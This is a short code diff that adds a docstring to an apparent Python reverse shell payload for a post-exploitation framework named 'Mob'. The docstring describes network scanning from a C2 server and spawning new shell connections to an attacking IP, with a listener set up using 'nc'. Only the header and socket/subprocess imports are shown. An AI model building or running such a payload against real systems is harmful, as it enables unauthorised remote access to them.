@@ -1,6 +1,13 @@
-##################
-# Second Version #
-##################
+"""
+Python reverse shell payload specially designed for Mob post-exploitation framework.
+This payload have netowrk scanning capabilities and It can also spawn a new shell connection from the target server to a new attacking system.
+
+1. Scan network from C2 server using: scan
+2. Spawn a new shell connection: spawn <Attacking IP> <port> and start listening from the attacking system using 'nc'.
+
+Author: shv-om
+"""
+
 
 import socket
 import subprocess
